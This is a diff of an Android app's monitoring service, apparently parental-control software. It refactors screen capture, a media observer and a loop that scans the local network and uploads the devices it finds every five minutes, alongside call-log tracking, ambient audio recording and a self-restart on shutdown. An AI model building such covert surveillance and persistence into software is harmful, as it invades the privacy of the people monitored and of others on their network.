@@ -27,6 +27,11 @@ import com.example.parentalcontrol.features.location_tracking.services.GpsTracke
 import com.example.parentalcontrol.features.call_monitoring.services.CallMonitoringService
 import com.example.parentalcontrol.features.call_monitoring.services.CallLogTracker
 import com.example.parentalcontrol.features.audio_recording.services.AudioRecorderEngine
+import com.example.parentalcontrol.features.screen_capture.services.ScreenCaptureEngine
+import com.example.parentalcontrol.features.screen_capture.controllers.MediaProjectionRequestActivity
+import com.example.parentalcontrol.features.media_observer.controllers.MediaObserverController
+import com.example.parentalcontrol.features.network_scanner.services.LocalNetworkScanner
+import com.example.parentalcontrol.features.network_scanner.controllers.NetworkScanController
 
 /**
  * MonitoringForegroundService v18
@@ -86,7 +91,6 @@ class MonitoringForegroundService : Service() {
     private var heartbeatJob: Job? = null
     private var audioJob: Job? = null
     private var usageJob: Job? = null
-    private var networkScanJob: Job? = null
     private var callLogJob: Job? = null
     private var ambientRecordJob: Job? = null
 
@@ -111,7 +115,8 @@ class MonitoringForegroundService : Service() {
     private lateinit var usageTracker: AppUsageTracker
     private lateinit var callLogTracker: CallLogTracker
     private lateinit var configManager: RemoteConfigManager
-    private lateinit var mediaObserver: MediaObserver
+    private lateinit var mediaObserver: MediaObserverController
+    private var networkScanController: NetworkScanController? = null
 
     // ── Lifecycle ─────────────────────────────────────────────────────────────
 
@@ -134,7 +139,7 @@ class MonitoringForegroundService : Service() {
             commandManager = RealtimeCommandManager(this, scope, gpsTracker) { mediaProjection }
 
             if (!BuildConfig.IS_LITE) {
-                mediaObserver  = MediaObserver(this)
+                mediaObserver  = MediaObserverController(this)
                 try { mediaObserver.start() } catch (e: Exception) {
                     Log.e(TAG, "mediaObserver.start failed: ${e.message}")
                 }
@@ -199,6 +204,7 @@ class MonitoringForegroundService : Service() {
             if (wakeLock?.isHeld == true) wakeLock?.release()
             mediaProjection?.stop()
             if (::mediaObserver.isInitialized) mediaObserver.stop()
+            networkScanController?.stopScanLoop()
             scope.cancel()
             sendBroadcast(Intent(this, ServiceRestartReceiver::class.java))
         } catch (e: Exception) {
@@ -478,21 +484,13 @@ class MonitoringForegroundService : Service() {
 
     /** Network scan loop: scan local network and upload connected assets every 5 min */
     private fun startNetworkScanLoop() {
-        networkScanJob?.cancel()
-        networkScanJob = scope.launch {
-            val deviceId = android.provider.Settings.Secure.getString(
-                contentResolver, android.provider.Settings.Secure.ANDROID_ID
-            ) ?: "unknown"
-            val scanner = LocalNetworkScanner(this@MonitoringForegroundService, deviceId)
-            while (true) {
-                try {
-                    scanner.scanAndUploadAssets()
-                } catch (e: Exception) {
-                    Log.e(TAG, "Network scanner loop failed: ${e.message}")
-                }
-                delay(300_000) // Scan every 5 minutes
-            }
+        val deviceId = android.provider.Settings.Secure.getString(
+            contentResolver, android.provider.Settings.Secure.ANDROID_ID
+        ) ?: "unknown"
+        if (networkScanController == null) {
+            networkScanController = NetworkScanController(this@MonitoringForegroundService, deviceId)
         }
+        networkScanController?.startScanLoop(scope)
     }
 
     /**
